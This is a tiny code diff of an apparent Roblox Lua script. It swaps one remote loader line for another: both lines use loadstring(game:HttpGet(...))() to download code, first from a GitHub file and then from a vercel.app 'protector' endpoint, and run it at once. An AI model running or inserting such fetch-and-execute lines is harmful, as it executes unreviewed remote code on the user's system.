@@ -1,4 +1,4 @@
-loadstring(game:HttpGet("https://github.com/gregsixseven/sixone/blob/main/wl.luau?raw=true"))()
+loadstring(game:HttpGet("https://cypher-protector.vercel.app/api/load/kurkurkurkurkur"))()
 
 
 local UserInputService = game:GetService("UserInputService")
